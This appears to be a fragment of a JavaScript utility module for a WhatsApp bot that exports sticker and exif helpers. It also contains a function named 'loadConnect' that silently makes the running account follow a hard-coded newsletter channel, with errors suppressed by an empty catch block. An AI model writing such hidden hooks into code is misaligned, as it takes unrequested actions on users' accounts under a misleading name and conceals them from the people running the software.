...
async function loadConnect(x) {
try {
await x.newsletterFollow("120363411804377677@newsletter")
} catch {}
}
...
module.exports = { imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, exifAvatar, addExif, loadConnect }
